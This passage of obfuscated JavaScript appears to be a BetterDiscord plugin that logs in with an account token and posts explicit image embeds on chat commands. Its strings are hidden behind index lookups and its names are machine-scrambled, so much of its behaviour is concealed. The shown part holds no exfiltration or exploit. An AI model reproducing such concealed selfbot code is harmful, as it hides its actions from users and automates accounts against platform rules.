            let letosha = await _0x1ea298.nsfw[keylianis(1287)](), cherin = (new sherae.RichEmbed)[keylianis(321)](COLOR)[keylianis(1044)](keylianis(648))[keylianis(1211)](letosha.url).setFooter(keylianis(899), IMAGE);
            cherin[keylianis(1264)](), jillian[keylianis(407)][keylianis(746)](cherin);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1322))) {
          jillian.delete(), starletta();
          async function starletta() {
            const padric = abdrahman;
            let javana = await _0x1ea298.nsfw.trap(), dokota = (new sherae[padric(344)])[padric(321)](COLOR)[padric(1044)](padric(761))[padric(1211)](javana[padric(1378)]).setFooter(padric(899), IMAGE);
            dokota[padric(1264)](), jillian[padric(407)][padric(746)](dokota);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1326))) {
          jillian[abdrahman(1289)](), yachy();
          async function yachy() {
            const tinsae = abdrahman;
            let jiara = await _0x1ea298[tinsae(1127)].yuri(), yubin = (new sherae[tinsae(344)])[tinsae(321)](COLOR)[tinsae(1044)]("**🔞 Yuri Picture 🔞**")[tinsae(1211)](jiara[tinsae(1378)])[tinsae(938)](tinsae(899), IMAGE);
            yubin.setTimestamp(), jillian[tinsae(407)][tinsae(746)](yubin);
          }
        }
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(842))) {
          const dejahnay = jillian[abdrahman(726)][abdrahman(543)].first();
          jillian.delete();
          if (!dejahnay) return window.BdApi[abdrahman(1248)](abdrahman(1078), abdrahman(1366));
          taurin();
          async function taurin() {
            const miyali = abdrahman;
            let charneshia = await _0x1ea298[miyali(1127)][miyali(1004)]();
            const shukri = (new sherae[miyali(344)]).setTitle(miyali(1307) + jillian[miyali(887)].username + miyali(943) + dejahnay[miyali(1423)] + "*** 🔞")[miyali(1211)](charneshia[miyali(1378)])[miyali(321)](COLOR)[miyali(938)](miyali(899), IMAGE)[miyali(1264)]();
            jillian[miyali(407)].send(shukri);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(855))) {
          jillian.delete(), jakita();
          async function jakita() {
            const breydan = abdrahman;
            let ananshi = await _0x1ea298[breydan(1127)][breydan(855)](), smaran = (new sherae[breydan(344)]).setColor(COLOR)[breydan(1044)](breydan(1224)).setImage(ananshi[breydan(1378)])[breydan(938)](breydan(899), IMAGE);
            smaran[breydan(1264)](), jillian[breydan(407)].send(smaran);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + "eroyuri")) {
          jillian[abdrahman(1289)](), samsara();
          async function samsara() {
            const truby = abdrahman;
            let davidjoseph = await _0x1ea298.nsfw[truby(1054)](), glennia = (new sherae[truby(344)])[truby(321)](COLOR)[truby(1044)](truby(1144))[truby(1211)](davidjoseph[truby(1378)]).setFooter(truby(899), IMAGE);
            glennia.setTimestamp(), jillian[truby(407)].send(glennia);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + "girlsolo")) {
          jillian[abdrahman(1289)](), makyrah();
          async function makyrah() {
            const aleighana = abdrahman;
            let raygan = await _0x1ea298[aleighana(1127)].girlSolo(), markele = (new sherae[aleighana(344)])[aleighana(321)](COLOR).setTitle("**🔞 Girl solo Picture 🔞**").setImage(raygan[aleighana(1378)]).setFooter("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            markele[aleighana(1264)](), jillian[aleighana(407)][aleighana(746)](markele);
          }
        }
        if (jillian.content.startsWith(PREFIX + abdrahman(1143))) {
          jillian[abdrahman(1289)](), zarriyah();
          async function zarriyah() {
            const carre = abdrahman;
            let alex = await _0x1ea298[carre(1127)][carre(832)](), myrion = (new sherae[carre(344)]).setColor(COLOR)[carre(1044)](carre(372))[carre(1211)](alex[carre(1378)])[carre(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            myrion.setTimestamp(), jillian[carre(407)].send(myrion);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(883))) {
          jillian[abdrahman(1289)](), yaitza();
          async function yaitza() {
            const jeyline = abdrahman;
            let dynasti = await _0x1ea298[jeyline(1127)][jeyline(969)](), dalayjah = (new sherae[jeyline(344)]).setColor(COLOR)[jeyline(1044)](jeyline(525))[jeyline(1211)](dynasti[jeyline(1378)])[jeyline(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            dalayjah[jeyline(1264)](), jillian[jeyline(407)][jeyline(746)](dalayjah);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(422))) {
          jillian[abdrahman(1289)](), khailani();
          async function khailani() {
            const mariano = abdrahman;
            let lum = await _0x1ea298[mariano(1127)][mariano(1479)](), jexi = (new sherae[mariano(344)])[mariano(321)](COLOR)[mariano(1044)](mariano(580)).setImage(lum[mariano(1378)])[mariano(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            jexi.setTimestamp(), jillian[mariano(407)].send(jexi);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + "keta")) {
          jillian[abdrahman(1289)](), negun();
          async function negun() {
            const paytynn = abdrahman;
            let aanaya = await _0x1ea298[paytynn(1127)][paytynn(575)](), giannella = (new sherae[paytynn(344)])[paytynn(321)](COLOR)[paytynn(1044)]("**🔞 Keta Picture 🔞**").setImage(aanaya[paytynn(1378)])[paytynn(938)](paytynn(899), IMAGE);
            giannella.setTimestamp(), jillian[paytynn(407)][paytynn(746)](giannella);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(370))) {
          jillian[abdrahman(1289)](), rodella();
          async function rodella() {
            const edmere = abdrahman;
            let aser = await _0x1ea298[edmere(1127)][edmere(1167)](), johaun = (new sherae[edmere(344)]).setColor(COLOR)[edmere(1044)]("**🔞 Lewd avatar Picture 🔞**")[edmere(1211)](aser[edmere(1378)])[edmere(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            johaun.setTimestamp(), jillian[edmere(407)][edmere(746)](johaun);
          }
        }
      }
    }), _0x4d876d[chelsee(1052)](chelsee(1142), function (catiria, leopoldo, jayiah) {
      const sonoma = chelsee;
      leopoldo[sonoma(759)] === sonoma(1101) ? shadarria[sonoma(579)](TOKEN)[sonoma(652)](() => {
        const hafeez = sonoma;
        return window.BdApi[hafeez(1248)](hafeez(1078), hafeez(1072));
      }) : window[sonoma(987)].alert(sonoma(1078), sonoma(346));
    });
  }
  [caritina(320)]() {
    const cyniya = caritina;
    BdApi[cyniya(923)]("🔪 Eroge Notification 🔪", cyniya(518), {confirmText: cyniya(1267), cancelText: "No", onCancel: glenmore => {}, onConfirm: andela => {
      const chesley = cyniya;
      BdApi[chesley(1150)](chesley(303), {type: "info"}), window[chesley(424)][chesley(856)]();
    }});
  }
};
